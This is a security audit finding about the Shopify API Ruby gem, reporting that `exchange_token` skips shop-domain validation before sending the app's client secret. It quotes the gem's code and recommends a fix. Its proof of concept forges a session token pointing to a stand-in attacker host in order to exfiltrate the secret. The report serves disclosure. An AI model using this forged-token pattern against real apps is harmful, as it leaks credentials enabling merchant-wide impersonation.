This is a strong finding: in `TokenExchange.exchange_token`, the shop used to build the HTTP client's base URI (the host that receives `client_id`/`client_secret`) is derived from the JWT `dest`/`iss` claims via `jwt_payload.shop`, **without** being passed through `Utils::ShopValidator.sanitize!`, unlike every other OAuth entry point in the gem.

### Title
Missing shop-domain validation in `TokenExchange.exchange_token` allows client_secret exfiltration to attacker-controlled host via forged session token `dest`/`iss` claims - (File: lib/shopify_api/auth/token_exchange.rb)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` extracts the destination shop directly from the JWT's `dest` claim (`jwt_payload.shop`) and uses it, unsanitized, as the host to which it POSTs a request body containing `client_id` and `client_secret` (the app's confidential credentials). Every other credential-sending flow in the gem (`ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, `TokenExchange.migrate_to_expiring_token`) calls `Utils::ShopValidator.sanitize!(shop)` before using the shop as a request host, but `exchange_token` does not.

### Finding Description
`ShopifyAPI::Auth::JwtPayload` verifies only that the JWT is signed with the app's own `api_secret_key` and that `aud == Context.api_key` (`lib/shopify_api/auth/jwt_payload.rb:43-44`). It performs no validation that `iss`/`dest` are actual `*.myshopify.com` (or other trusted Shopify) domains — `shop` is simply `@dest.gsub("https://", "")` (`lib/shopify_api/auth/jwt_payload.rb:48-50`). [1](#0-0) 

In `exchange_token`, this unsanitized `dest_shop` value is used directly to build the session that determines the request host:
```ruby
jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
dest_shop = jwt_payload.shop
...
shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
body = { client_id: ..., client_secret: ShopifyAPI::Context.api_secret_key, ... }
client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
client.request(... path: "access_token" ...)
``` [2](#0-1) 

`Clients::HttpClient#initialize` builds the request host directly from `session.shop` when `Context.api_host` is not configured: `@base_uri = "https://#{api_host || session.shop}"`. [3](#0-2) 

Compare this with the sibling method `migrate_to_expiring_token` in the same file, and with `ClientCredentials.client_credentials` / `RefreshToken.refresh_access_token`, all of which call `validated_shop = Utils::ShopValidator.sanitize!(shop)` before constructing the session used for the credential-bearing request: [4](#0-3) [5](#0-4) [6](#0-5) 

`ShopValidator.sanitize!` exists precisely to reject any shop/host string that isn't a subdomain of a trusted Shopify domain (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`), raising `Errors::InvalidShopError` otherwise. [7](#0-6) 

**The broken binding**: the host that ultimately receives `Context.api_secret_key` should equal `ShopValidator.sanitize!(shop)` (a Shopify-trusted domain), but in `exchange_token` it instead equals the raw, unvalidated `dest` claim string taken from a JWT that only proves possession of `api_secret_key` (which the host application already knows) — the claim content itself (`iss`/`dest`) is never constrained to a Shopify domain by this library.

### Impact Explanation
If a host application obtains a "session token" from a source that is not exclusively Shopify's App Bridge (e.g., a value forwarded from an untrusted or manipulable client-side context, or if the app itself constructs/receives JWTs with attacker-influenced `dest`/`iss` before calling `exchange_token`), the attacker can set `dest` to an arbitrary host they control. `exchange_token` will then send an HTTP POST containing the app's `client_id` and `client_secret` directly to that attacker-controlled host, exfiltrating the app's `client_secret` — a Critical-impact credential leak enabling full app impersonation across all merchants.

### Likelihood Explanation
Exploitation requires the calling application to pass a `session_token` whose signature is valid (i.e., signed with the correct `api_secret_key`) but whose `dest`/`iss` claims are attacker-controlled. In the canonical embedded-app flow, Shopify's App Bridge is the only entity that mints these JWTs, so a "normal" caller is not exposed. However, the risk lies in `exchange_token`'s asymmetry with its sibling functions in the same module: the library itself provides no defense-in-depth if the JWT signing/verification pathway is ever satisfied by a non-Shopify-issued token (e.g., misconfigured shared secrets, test/staging environments reusing the API secret, or future callers), whereas `migrate_to_expiring_token`, `client_credentials`, and `refresh_access_token` are protected either way. This is a genuine gap in the library's own defense layering, not merely a documented API being ignored by the host.

### Recommendation
In `ShopifyAPI::Auth::TokenExchange.exchange_token`, sanitize `dest_shop` through `Utils::ShopValidator.sanitize!` (as already done in `migrate_to_expiring_token`) before constructing `shop_session`, so the shop used to route the `client_id`/`client_secret`-bearing request is always constrained to a trusted Shopify domain, regardless of the JWT's `dest`/`iss` claim content.

### Proof of Concept
```ruby
# Attacker crafts (or otherwise obtains) a JWT signed with the app's known api_secret_key
# where dest/iss point to an attacker-controlled host instead of a *.myshopify.com shop.
forged_payload = {
  iss: "https://evil.attacker.example/admin",
  dest: "https://evil.attacker.example",
  aud: ShopifyAPI::Context.api_key,
  sub: "1",
  exp: (Time.now + 10).to_i,
  nbf: 1234,
  iat: 1234,
  jti: "x",
}
forged_token = JWT.encode(forged_payload, ShopifyAPI::Context.api_secret_key, "HS256")

# exchange_token trusts jwt_payload.shop (== "evil.attacker.example") unsanitized:
ShopifyAPI::Auth::TokenExchange.exchange_token(
  session_token: forged_token,
  requested_token_type: ShopifyAPI::Auth::TokenExchange::RequestedTokenType::OFFLINE_ACCESS_TOKEN,
)
# => POST https://evil.attacker.example/admin/oauth/access_token
#    body includes { client_id: <app id>, client_secret: <APP'S SECRET> }
```
`lib/shopify_api/auth/token_exchange.rb:39-74` shows no `ShopValidator.sanitize!` call is made on `dest_shop`, unlike `lib/shopify_api/auth/token_exchange.rb:97-104`, confirming the asymmetric gap. [8](#0-7)

### Citations

**File:** lib/shopify_api/auth/jwt_payload.rb (L43-50)
```ruby
        raise ShopifyAPI::Errors::InvalidJwtTokenError,
          "Session token had invalid API key" unless @aud == Context.api_key
      end

      sig { returns(String) }
      def shop
        @dest.gsub("https://", "")
      end
```

**File:** lib/shopify_api/auth/token_exchange.rb (L39-74)
```ruby
          # Validate the session token and use the shop from the token's `dest` claim
          jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
          dest_shop = jwt_payload.shop

          if shop
            ShopifyAPI::Logger.deprecated(
              "The `shop` parameter for `exchange_token` is deprecated and will be removed in v17. " \
                "The shop is now always taken from the session token's `dest` claim.",
              "17.0.0",
            )
          end

          shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: session_token,
            subject_token_type: ID_TOKEN_TYPE,
            requested_token_type: requested_token_type.serialize,
          }

          if requested_token_type == RequestedTokenType::OFFLINE_ACCESS_TOKEN
            body.merge!({ expiring: ShopifyAPI::Context.expiring_offline_access_tokens ? 1 : 0 })
          end

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
```

**File:** lib/shopify_api/auth/token_exchange.rb (L97-104)
```ruby
        def migrate_to_expiring_token(shop:, non_expiring_offline_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/clients/http_client.rb (L16-19)
```ruby
        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```

**File:** lib/shopify_api/auth/client_credentials.rb (L19-26)
```ruby
        def client_credentials(shop:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/auth/refresh_token.rb (L18-25)
```ruby
        def refresh_access_token(shop:, refresh_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/utils/shop_validator.rb (L9-64)
```ruby
      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )

      class << self
        extend T::Sig

        sig do
          params(
            shop_domain: String,
            myshopify_domain: T.nilable(String),
          ).returns(T.nilable(String))
        end
        def sanitize_shop_domain(shop_domain, myshopify_domain: nil)
          uri = uri_from_shop_domain(shop_domain, myshopify_domain)
          return nil if uri.nil? || uri.host.nil? || uri.host.empty?

          trusted_domains(myshopify_domain).each do |trusted_domain|
            host = T.cast(uri.host, String)
            uri_domain = uri.domain
            next if uri_domain.nil?

            no_shop_name_in_subdomain = host == trusted_domain
            from_trusted_domain = trusted_domain == uri_domain

            if unified_admin?(uri) && from_trusted_domain
              return myshopify_domain_from_unified_admin(uri)
            end
            return nil if no_shop_name_in_subdomain || host.empty?
            return host if from_trusted_domain
          end
          nil
        end

        sig do
          params(
            shop: String,
            myshopify_domain: T.nilable(String),
          ).returns(String)
        end
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
```
